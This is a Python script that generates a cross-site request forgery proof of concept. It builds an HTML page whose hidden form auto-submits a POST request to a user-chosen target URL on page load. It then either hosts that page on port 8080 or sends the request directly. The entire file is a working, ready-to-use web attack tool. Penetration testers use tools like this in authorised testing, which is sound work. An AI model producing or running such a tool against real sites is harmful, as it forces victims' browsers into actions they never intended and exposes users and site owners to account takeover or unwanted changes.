import os
import http.server
import socketserver
import requests

def get_user_input():
    """Ask the user for the target URL and parameters."""
    print("CSRF PoC Generator")
    target_url = input("Enter the target URL (e.g., http://example.com/endpoint): ").strip()
    
    # Get the parameters in a single input string
    param_string = input("Enter the parameters for the request: ").strip()
    
    # Split the parameter string into a dictionary
    params = {}
    if param_string:
        for param in param_string.split("&"):
            if "=" in param:
                key, value = param.split("=", 1)
                params[key.strip()] = value.strip()
            else:
                print(f"Skipping invalid parameter: {param}")
    
    return target_url, params

def generate_csrf_poc(target_url, params):
    """Generate the CSRF PoC HTML."""
    # Convert parameters into hidden input fields
    form_inputs = "".join(
        f'<input type="hidden" name="{k}" value="{v}"/>' for k, v in params.items()
    )
    
    csrf_html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC</title>
</head>
<body>
    <h1>CSRF Proof of Concept</h1>
    <form action="{target_url}" method="POST">
        {form_inputs}
        <input type="submit" value="Submit">
    </form>
    <script>
        document.forms[0].submit();  // Automatically submits the form
    </script>
</body>
</html>
"""
    poc_file = "csrf.html"
    with open(poc_file, "w") as file:
        file.write(csrf_html)
    print(f"CSRF PoC HTML saved as {poc_file}")
    return poc_file

def start_server(poc_file):
    """Host the CSRF PoC HTML."""
    os.chdir(".")  # Serve from current directory
    handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("0.0.0.0", 8080), handler) as httpd:
        print(f"Serving {poc_file} on port 8080...")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\nServer stopped.")

def send_exploit(target_url, params):
    """Send the exploit to the target URL."""
    response = requests.post(target_url, data=params)
    print(f"Exploit sent to {target_url}. Response status: {response.status_code}")
    print("Response body:", response.text[:200])  # Show a snippet of the response

# Main Execution
if __name__ == "__main__":
    target_url, params = get_user_input()
    poc_file = generate_csrf_poc(target_url, params)
    
    print("\nOptions:")
    print("1. Host the CSRF PoC HTML file.")
    print("2. Send the exploit to the target URL.\n")
    choice = input("Choose (1 or 2): ").strip()

    if choice == "1":
        start_server(poc_file)
    elif choice == "2":
        send_exploit(target_url, params)
    else:
        print("Invalid choice.")
